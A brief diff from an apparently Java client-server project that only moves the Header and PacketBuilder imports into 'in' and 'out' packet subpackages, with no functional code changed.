@@ -4,8 +4,8 @@ import javax.swing.ImageIcon;
 import javax.swing.JOptionPane;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.Header;
-import com.redpois0n.packets.PacketBuilder;
+import com.redpois0n.packets.in.PacketBuilder;
+import com.redpois0n.packets.out.Header;
 import com.redpois0n.utils.IconUtils;
 import com.redpois0n.utils.Util;
 
